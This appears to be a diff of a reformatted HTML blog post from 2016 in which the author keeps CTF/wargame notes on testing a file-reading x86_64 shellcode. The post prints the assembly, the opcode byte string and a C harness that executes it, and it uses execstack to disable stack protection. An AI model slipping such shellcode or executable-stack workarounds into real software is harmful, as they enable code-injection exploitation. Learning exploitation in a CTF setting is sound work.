@@ -1,61 +1,145 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><title>Testing shellcodes - blog.dornea.nu</title><meta content="Testing shellcodes - blog.dornea.nu" property="title"><meta content="Testing shellcodes - blog.dornea.nu" property="og:title"><meta property="og:description" content="While playing some wargames where I had to read a file called flag.txt using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.
-BITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 Shellcode ; Shellcode size 82 bytes global _start section .text _start: jmp _push_filename _readfile: ; syscall open file pop rdi ; pop path value ; NULL byte fix xor byte [rdi + 11], 0x41 xor rax, rax add al, 2 xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rdx, rdx mov dx, 0xfff; size to read xor rax, rax syscall ; syscall write to stdout xor rdi, rdi add dil, 1 ; set stdout fd = 1 mov rdx, rax xor rax, rax add al, 1 syscall ; syscall exit xor rax, rax add al, 60 syscall _push_filename: call _readfile path: db &#34;flag."><meta property="og:type" content="article"><meta property="og:url" content="http://blog.dornea.nu/2016/08/23/testing-shellcodes/"><meta property="article:published_time" content="2016-08-23T00:00:00+00:00"><meta property="article:modified_time" content="2016-08-23T00:00:00+00:00"><meta name=generator content="Hugo 0.75.1"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel=stylesheet><style type=text/css>:root{--main-color: #8C6056;--secondary-color: #AFD5AA;--logo-text-color: #fff;--body-text-color: #3d3d3d;--heading-text-color: #383838;--background-color: #fff}</style><link href=http://blog.dornea.nu/css/tachyons.min.css rel=stylesheet><link href=http://blog.dornea.nu/css/styles.css rel=stylesheet><link rel=icon href=http://blog.dornea.nu/favicon.ico type=image/x-icon><link href=http://blog.dornea.nu/feed.xml rel=alternate type=application/atom+xml title=blog.dornea.nu></head><body class=global-font><nav class="flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id=navbar><div class=flex><a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id=site-title href=http://blog.dornea.nu/ title=Home>blog.dornea.nu</a></div><div class="flex-ns mt2 mt0-ns pv1"><a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/ title=Home>Home</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://dornea.nu title=About>About</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/tags title=Tags>Tags</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org title=Zettelkasten>Zettelkasten</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bookmarks.html title=Bookmarks>Bookmarks</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bib.html title=Books>Books</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/notes title=Notes>Notes</a></div></nav><main class="center mv4 content-width ph3"><div class="f3 fw6 heading-color heading-font post-title">Testing shellcodes</div><p class="silver f6 mt1 mb4 post-meta"><time>23 Aug 2016</time>
-|
-tags: [ <a href=http://blog.dornea.nu/tags/c class="link silver">c</a> <a href=http://blog.dornea.nu/tags/asm class="link silver">asm</a> <a href=http://blog.dornea.nu/tags/ctf class="link silver">ctf</a> <a href=http://blog.dornea.nu/tags/wargames class="link silver">wargames</a> ]</p><div class="lh-copy post-content"><p>While playing some <a href=http://blog.dornea.nu/tag/wargames/>wargames</a> where I had to read a file called <strong>flag.txt</strong> using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.asm data-lang=.asm><span style=color:#6ab825;font-weight:700>BITS</span> <span style=color:#3677a9>64</span>
-<span style=color:#999;font-style:italic>; Author Mr.Un1k0d3r - RingZer0 Team</span>
-<span style=color:#999;font-style:italic>; Read /etc/passwd Linux x86_64 Shellcode</span>
-<span style=color:#999;font-style:italic>; Shellcode size 82 bytes</span>
-<span style=color:#6ab825;font-weight:700>global</span> <span style=color:#40ffff>_start</span>
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+  <title>Testing shellcodes - blog.dornea.nu</title>
+  <meta content='Testing shellcodes - blog.dornea.nu' property='title' />
+  <meta content='Testing shellcodes - blog.dornea.nu' property='og:title' />
+
+
+<meta property="og:description" content="While playing some wargames where I had to read a file called flag.txt using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.
+BITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 Shellcode ; Shellcode size 82 bytes global _start section .text _start: jmp _push_filename _readfile: ; syscall open file pop rdi ; pop path value ; NULL byte fix xor byte [rdi &#43; 11], 0x41 xor rax, rax add al, 2 xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rdx, rdx mov dx, 0xfff; size to read xor rax, rax syscall ; syscall write to stdout xor rdi, rdi add dil, 1 ; set stdout fd = 1 mov rdx, rax xor rax, rax add al, 1 syscall ; syscall exit xor rax, rax add al, 60 syscall _push_filename: call _readfile path: db &#34;flag." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.dornea.nu/2016/08/23/testing-shellcodes/" />
+
+
+<meta property="article:published_time" content="2016-08-23T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2016-08-23T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.75.1" />
+
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
+<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
+:root {
+  --main-color: #8C6056; 
+  --secondary-color: #AFD5AA;
+  --logo-text-color: #fff;
+  --body-text-color: #3d3d3d;
+  --heading-text-color: #383838;
+  --background-color: #fff;
+}</style>
+<link href='http://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
+<link href='http://blog.dornea.nu/css/styles.css' rel="stylesheet">
+
+
+<link rel="icon" 
  
-<span style=color:#6ab825;font-weight:700>section</span> <span style=color:#40ffff>.text</span>
+  href='http://blog.dornea.nu/favicon.ico'
+
+type="image/x-icon"/>
+
+<link href='http://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />
+</head>
+<body class="global-font">
+  <nav class=" flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id="navbar">
+  <div class="flex">
+    <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id="site-title" href='http://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
+  </div>
+  
+  <div class=" flex-ns mt2 mt0-ns pv1">
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/' title="Home">Home</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://dornea.nu' title="About">About</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/tags' title="Tags">Tags</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bookmarks.html' title="Bookmarks">Bookmarks</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bib.html' title="Books">Books</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/notes' title="Notes">Notes</a>
+    
+  </div>
+  
+</nav>
+  
+<main class="center mv4 content-width ph3">
+  <div class="f3 fw6 heading-color heading-font post-title">Testing shellcodes</div>
+  <p class="silver f6 mt1 mb4 post-meta">
+    <time>23 Aug 2016</time> 
+     | 
+    
+    
+    tags: [ <a href='http://blog.dornea.nu/tags/c' class="link silver">c</a> <a href='http://blog.dornea.nu/tags/asm' class="link silver">asm</a> <a href='http://blog.dornea.nu/tags/ctf' class="link silver">ctf</a> <a href='http://blog.dornea.nu/tags/wargames' class="link silver">wargames</a>  ]
+    
+  </p>
+  <div class="lh-copy post-content"><p>While playing some <a href="http://blog.dornea.nu/tag/wargames/">wargames</a> where I had to read a file called <strong>flag.txt</strong> using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.asm" data-lang=".asm"><span style="color:#6ab825;font-weight:bold">BITS</span> <span style="color:#3677a9">64</span>
+<span style="color:#999;font-style:italic">; Author Mr.Un1k0d3r - RingZer0 Team</span>
+<span style="color:#999;font-style:italic">; Read /etc/passwd Linux x86_64 Shellcode</span>
+<span style="color:#999;font-style:italic">; Shellcode size 82 bytes</span>
+<span style="color:#6ab825;font-weight:bold">global</span> <span style="color:#40ffff">_start</span>
+ 
+<span style="color:#6ab825;font-weight:bold">section</span> <span style="color:#40ffff">.text</span>
  
 _start:
-    <span style=color:#447fcf>jmp</span> <span style=color:#40ffff>_push_filename</span>
+    <span style="color:#447fcf">jmp</span> <span style="color:#40ffff">_push_filename</span>
    
 _readfile:
-<span style=color:#999;font-style:italic>; syscall open file</span>
-    <span style=color:#447fcf>pop</span> <span style=color:#24909d>rdi</span> <span style=color:#999;font-style:italic>; pop path value</span>
-    <span style=color:#999;font-style:italic>; NULL byte fix</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#6ab825;font-weight:700>byte</span> [<span style=color:#24909d>rdi</span> + <span style=color:#3677a9>11</span>], <span style=color:#3677a9>0x41</span>
+<span style="color:#999;font-style:italic">; syscall open file</span>
+    <span style="color:#447fcf">pop</span> <span style="color:#24909d">rdi</span> <span style="color:#999;font-style:italic">; pop path value</span>
+    <span style="color:#999;font-style:italic">; NULL byte fix</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#6ab825;font-weight:bold">byte</span> [<span style="color:#24909d">rdi</span> + <span style="color:#3677a9">11</span>], <span style="color:#3677a9">0x41</span>
        
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rax</span>, <span style=color:#24909d>rax</span>
-    <span style=color:#447fcf>add</span> <span style=color:#24909d>al</span>, <span style=color:#3677a9>2</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rsi</span>, <span style=color:#24909d>rsi</span> <span style=color:#999;font-style:italic>; set O_RDONLY flag</span>
-    <span style=color:#447fcf>syscall</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rax</span>, <span style="color:#24909d">rax</span>
+    <span style="color:#447fcf">add</span> <span style="color:#24909d">al</span>, <span style="color:#3677a9">2</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rsi</span>, <span style="color:#24909d">rsi</span> <span style="color:#999;font-style:italic">; set O_RDONLY flag</span>
+    <span style="color:#447fcf">syscall</span>
        
-<span style=color:#999;font-style:italic>; syscall read file</span>
-    <span style=color:#447fcf>sub</span> <span style=color:#24909d>sp</span>, <span style=color:#3677a9>0xfff</span>
-    <span style=color:#447fcf>lea</span> <span style=color:#24909d>rsi</span>, [<span style=color:#24909d>rsp</span>]
-    <span style=color:#447fcf>mov</span> <span style=color:#24909d>rdi</span>, <span style=color:#24909d>rax</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rdx</span>, <span style=color:#24909d>rdx</span>
-    <span style=color:#447fcf>mov</span> <span style=color:#24909d>dx</span>, <span style=color:#3677a9>0xfff</span><span style=color:#999;font-style:italic>; size to read</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rax</span>, <span style=color:#24909d>rax</span>
-    <span style=color:#447fcf>syscall</span>
+<span style="color:#999;font-style:italic">; syscall read file</span>
+    <span style="color:#447fcf">sub</span> <span style="color:#24909d">sp</span>, <span style="color:#3677a9">0xfff</span>
+    <span style="color:#447fcf">lea</span> <span style="color:#24909d">rsi</span>, [<span style="color:#24909d">rsp</span>]
+    <span style="color:#447fcf">mov</span> <span style="color:#24909d">rdi</span>, <span style="color:#24909d">rax</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rdx</span>, <span style="color:#24909d">rdx</span>
+    <span style="color:#447fcf">mov</span> <span style="color:#24909d">dx</span>, <span style="color:#3677a9">0xfff</span><span style="color:#999;font-style:italic">; size to read</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rax</span>, <span style="color:#24909d">rax</span>
+    <span style="color:#447fcf">syscall</span>
    
-<span style=color:#999;font-style:italic>; syscall write to stdout</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rdi</span>, <span style=color:#24909d>rdi</span>
-    <span style=color:#447fcf>add</span> <span style=color:#24909d>di</span><span style=color:#40ffff>l</span>, <span style=color:#3677a9>1</span> <span style=color:#999;font-style:italic>; set stdout fd = 1</span>
-    <span style=color:#447fcf>mov</span> <span style=color:#24909d>rdx</span>, <span style=color:#24909d>rax</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rax</span>, <span style=color:#24909d>rax</span>
-    <span style=color:#447fcf>add</span> <span style=color:#24909d>al</span>, <span style=color:#3677a9>1</span>
-    <span style=color:#447fcf>syscall</span>
+<span style="color:#999;font-style:italic">; syscall write to stdout</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rdi</span>, <span style="color:#24909d">rdi</span>
+    <span style="color:#447fcf">add</span> <span style="color:#24909d">di</span><span style="color:#40ffff">l</span>, <span style="color:#3677a9">1</span> <span style="color:#999;font-style:italic">; set stdout fd = 1</span>
+    <span style="color:#447fcf">mov</span> <span style="color:#24909d">rdx</span>, <span style="color:#24909d">rax</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rax</span>, <span style="color:#24909d">rax</span>
+    <span style="color:#447fcf">add</span> <span style="color:#24909d">al</span>, <span style="color:#3677a9">1</span>
+    <span style="color:#447fcf">syscall</span>
    
-<span style=color:#999;font-style:italic>; syscall exit</span>
-    <span style=color:#447fcf>xor</span> <span style=color:#24909d>rax</span>, <span style=color:#24909d>rax</span>
-    <span style=color:#447fcf>add</span> <span style=color:#24909d>al</span>, <span style=color:#3677a9>60</span>
-    <span style=color:#447fcf>syscall</span>
+<span style="color:#999;font-style:italic">; syscall exit</span>
+    <span style="color:#447fcf">xor</span> <span style="color:#24909d">rax</span>, <span style="color:#24909d">rax</span>
+    <span style="color:#447fcf">add</span> <span style="color:#24909d">al</span>, <span style="color:#3677a9">60</span>
+    <span style="color:#447fcf">syscall</span>
    
 _push_filename:
-    <span style=color:#447fcf>call</span> <span style=color:#40ffff>_readfile</span>
-    path: <span style=color:#6ab825;font-weight:700>db</span> <span style=color:#ed9d13>&#34;flag.txt&#34;</span>
-</code></pre></div><h2 id=shellcode-compilation>Shellcode compilation</h2><p>Compile using <strong>nasm</strong>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ nasm -f elf64 shellcode.asm -o shellcode.o
-</code></pre></div><h2 id=disassemble>Disassemble</h2><p>Now you can disassemble the object file using <strong>objdump</strong>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>shellcode.o:     file format elf64-x86-64
+    <span style="color:#447fcf">call</span> <span style="color:#40ffff">_readfile</span>
+    path: <span style="color:#6ab825;font-weight:bold">db</span> <span style="color:#ed9d13">&#34;flag.txt&#34;</span>
+</code></pre></div><h2 id="shellcode-compilation">Shellcode compilation</h2>
+<p>Compile using <strong>nasm</strong>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nasm -f elf64 shellcode.asm -o shellcode.o
+</code></pre></div><h2 id="disassemble">Disassemble</h2>
+<p>Now you can disassemble the object file using <strong>objdump</strong>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">shellcode.o:     file format elf64-x86-64
 
 
 Disassembly of section .text:
@@ -96,43 +180,145 @@ Disassembly of section .text:
   49:   67 2e 74 78             addr32 je,pn c5 &lt;path+0x7f&gt;
   4d:   74                      .byte 0x74
 
-</code></pre></div><h2 id=assembler-to-c>Assembler to C</h2><p>Now convert the opcodes to some C array:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ for i in $(objdump -d shellcode.o |grep &#34;^ &#34; |cut -f2); do echo -n &#39;\\x&#39;$i; done;echo
+</code></pre></div><h2 id="assembler-to-c">Assembler to C</h2>
+<p>Now convert the opcodes to some C array:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ for i in $(objdump -d shellcode.o |grep &#34;^ &#34; |cut -f2); do echo -n &#39;\\x&#39;$i; done;echo
 \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74
-</code></pre></div><p>Now use this code:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;stdio.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;string.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;stdlib.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;unistd.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;fcntl.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;sys/types.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;sys/stat.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700></span>
-<span style=color:#6ab825;font-weight:700>unsigned</span> <span style=color:#6ab825;font-weight:700>char</span> code[] = \
-<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span style=color:#ed9d13>&#34;</span>;
+</code></pre></div><p>Now use this code:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/stat.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold"></span>
+<span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">char</span> code[] = \
+<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span style="color:#ed9d13">&#34;</span>;
 
-<span style=color:#6ab825;font-weight:700>int</span> <span style=color:#447fcf>main</span>(<span style=color:#6ab825;font-weight:700>int</span> argc, <span style=color:#6ab825;font-weight:700>char</span> **argv) {
-    <span style=color:#6ab825;font-weight:700>void</span> (*fp) (<span style=color:#6ab825;font-weight:700>void</span>);
-    fp = (<span style=color:#6ab825;font-weight:700>void</span> *)code;
+<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv) {
+    <span style="color:#6ab825;font-weight:bold">void</span> (*fp) (<span style="color:#6ab825;font-weight:bold">void</span>);
+    fp = (<span style="color:#6ab825;font-weight:bold">void</span> *)code;
     fp();
 }
 
-</code></pre></div><h2 id=c-code-compilation>C code compilation</h2><p>&mldr; and compile it.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
+</code></pre></div><h2 id="c-code-compilation">C code compilation</h2>
+<p>&hellip; and compile it.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
 bin.c: In function &#39;main&#39;:
 bin.c:20:1: warning: control reaches end of non-void function [-Wreturn-type]
  }
-</code></pre></div><h2 id=make-stack-executable>Make stack executable</h2><p>The binary will segfault if executed. That&rsquo;s because the stack isn&rsquo;t executable:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ readelf -l bin | grep -C 2 GNU_STACK
+</code></pre></div><h2 id="make-stack-executable">Make stack executable</h2>
+<p>The binary will segfault if executed. That&rsquo;s because the stack isn&rsquo;t executable:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -l bin | grep -C 2 GNU_STACK
 
   GNU_EH_FRAME   0x00000000000005e4 0x00000000004005e4 0x00000000004005e4
                  0x0000000000000034 0x0000000000000034  R      4
   GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                  0x0000000000000000 0x0000000000000000  RW     10
-</code></pre></div><p>Let&rsquo;s make the stack executable:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ /usr/sbin/execstack -s bin
-</code></pre></div><p>And finally run the executable:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ cat flag.txt
+</code></pre></div><p>Let&rsquo;s make the stack executable:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ /usr/sbin/execstack -s bin
+</code></pre></div><p>And finally run the executable:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat flag.txt
 bla
 $ ./bin
 bla
-</code></pre></div></div></main><div class="tl fixed list-pages lh-copy" id=contents-list></div><div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l"><a id=scroll-to-top class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick=topFunction() style="color:#fff;visibility:hidden;display:none;transition:opacity .5s,visibility .5s" title="back to top">back to top</a><br><p class="mb0 mt2"><a href=http://blog.dornea.nu/2016/02/18/tls-client-authentication-using-bitnami-nginx-stack/>prev post</a>
-<a href=http://blog.dornea.nu/2016/08/26/automatic-file-uploads/>next post</a></p></div><footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l"><hr class="dn db-l ml0-l gray w3"><br>Powered by <a href=https://gohugo.io/ target=_blank class="link gray dim">Hugo</a>, based on the <a href=https://github.com/lingxz/er target=_blank class="link gray dim">Er</a> theme.<br></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js></script><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css><style>.is-active-link::before{background-color:var(--secondary-color)}</style><script type=text/javascript>var prevScrollpos=window.pageYOffset;window.onscroll=function(){var currentScrollPos=window.pageYOffset;if(document.getElementById("tag-cloud")!==null){if(prevScrollpos>currentScrollPos){document.getElementById("tag-cloud").style.visibility="visible";document.getElementById("tag-cloud").style.opacity="1";}else{document.getElementById("tag-cloud").style.visibility="hidden";document.getElementById("tag-cloud").style.opacity="0";}}
-if(document.body.scrollTop>1000||document.documentElement.scrollTop>1000){document.getElementById("scroll-to-top").style.display="inline";document.getElementById("scroll-to-top").style.visibility="visible";document.getElementById("scroll-to-top").style.opacity="1";}else{document.getElementById("scroll-to-top").style.visibility="hidden";document.getElementById("scroll-to-top").style.opacity="0";}
-prevScrollpos=currentScrollPos;}
-function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}
-if(document.getElementById("contents-list")!==null&&document.getElementsByClassName("post-content").length!==0){tocbot.init({tocSelector:'#contents-list',contentSelector:'.post-content',headingSelector:'h1, h2, h3',});}</script></body></html>
+</code></pre></div></div>
+</main>
+ 
+
+
+
+
+
+
+<div class="tl fixed list-pages lh-copy" id="contents-list"></div>
+
+
+
+<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
+  
+<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
+<br>
+  <p class="mb0 mt2">
+  <a href="http://blog.dornea.nu/2016/02/18/tls-client-authentication-using-bitnami-nginx-stack/">prev post</a>
+  <a href="http://blog.dornea.nu/2016/08/26/automatic-file-uploads/">next post</a>
+  </p>
+</div>
+
+  <footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l">
+  <hr class="dn db-l ml0-l gray w3"><br>
+  Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme. <br>
+  
+</footer>
+  
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<style>.is-active-link::before { background-color: var(--secondary-color); }</style>
+
+
+
+
+<script type="text/javascript">
+var prevScrollpos = window.pageYOffset;
+window.onscroll = function() {
+  var currentScrollPos = window.pageYOffset;
+
+  
+  if (document.getElementById("tag-cloud") !== null) { 
+    if (prevScrollpos > currentScrollPos) { 
+      document.getElementById("tag-cloud").style.visibility = "visible";
